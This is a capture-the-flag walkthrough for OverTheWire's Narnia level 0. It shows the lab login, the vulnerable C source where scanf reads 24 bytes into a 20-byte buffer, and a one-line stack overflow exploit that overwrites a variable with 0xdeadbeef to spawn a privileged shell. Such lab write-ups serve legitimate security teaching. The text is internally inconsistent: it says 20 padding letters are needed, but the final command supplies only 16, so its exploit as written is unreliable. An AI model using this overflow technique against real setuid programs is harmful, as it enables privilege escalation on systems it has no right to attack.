# Narina 0

    SSH  : ssh narnia0@narnia.labs.overthewire.org -p 2226
    Pass : narnia0

# Method For Solvoing 
First we are going to nativate to /narnia/ directory and analyze . 
there we can see the narnia0 file . 
when we execute that file we can see 
```
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: arun
buf: arun
val: 0x41414141
WAY OFF!!!!
```
From this we can understad that we have to change the val's value from 0x41414141 -> 0xdeadbeef!

Now viewing the narnia0.c file 

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
Here, the issue come from the scanf() function. It allows the user to enter 24 chars however, the buf variable is only 20 bytes so, we can overwrite 4 bytes.

Let’s try to write 24 bytes as input and check if the address changes.

```
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

Using this command we can add some random 20 letters in the starting and hex convert the deadfeef and give it a input

       (printf "arunarunarunarun\xef\xbe\xad\xde" ; cat) | ./narnia0

printf command is a shell command that pre process the hex values and execute . Using this command this level can be solved
